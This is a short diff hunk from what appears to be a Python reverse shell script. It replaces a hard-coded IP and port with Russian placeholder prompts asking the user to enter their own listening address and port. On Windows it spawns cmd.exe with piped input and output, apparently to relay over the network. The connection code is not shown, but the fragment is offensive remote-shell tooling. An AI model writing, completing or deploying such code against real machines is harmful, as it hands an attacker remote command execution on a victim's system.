@@ -4,8 +4,8 @@ import threading
 import subprocess as sp
 import platform
 
-ip_addr = '192.168.1.255'
-port = 8080
+ip_addr = 'Введите свой IP адрес'
+port = 'Введи порт с которого будете слушать'
 
 if platform.system() == 'Windows':
     p = sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT)
